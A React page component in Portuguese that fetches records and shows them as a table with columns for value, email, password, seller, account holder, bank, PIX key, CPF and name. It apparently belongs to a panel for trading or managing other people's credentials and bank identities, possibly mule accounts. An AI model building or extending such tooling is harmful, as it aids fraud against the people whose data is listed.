import React from 'react';
import Styles from './LaraInfoPage.module.css';
import Loading from '../../../../../Partials/Loading';
import LaraInfo from './components/LaraInfo';
import { GlobalContext } from '../../../../../../../GloblStorage';

const LaraInfoPage = () => {
  const [data, setData] = React.useState(null);

  const Global = React.useContext(GlobalContext);

  async function getDatas() {
    try {
      let token = localStorage.getItem('token');
      const response = await fetch(Global.url + '/getInfos', {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json'
        },
        body: JSON.stringify({ type: 'lara', token })
      });
      const json = await response.json();
      setData(json);
    } catch {
    } finally {
    }
  }

  React.useEffect(() => {
    getDatas();
    // eslint-disable-next-line react-hooks/exhaustive-deps
  }, []);

  return (
    <div className={Styles.container}>
      {data ? (
        data.length > 0 ? (
          <>
            <div className={Styles.titles}>
              <div></div>
              <div>Valor</div>
              <div>Email</div>
              <div>Senha</div>
              <div>Vendedor</div>
              <div>Titular</div>
              <div>Banco</div>
              <div>PIX</div>
              <div>CPF</div>
              <div>Nome</div>
              <div>Nivel</div>
            </div>
            {data.reverse().map((card) => (
              <LaraInfo key={card.id} {...card} />
            ))}
          </>
        ) : (
          <div className={Styles.err}>Voc no tem infos</div>
        )
      ) : (
        <Loading />
      )}
    </div>
  );
};
export default LaraInfoPage;
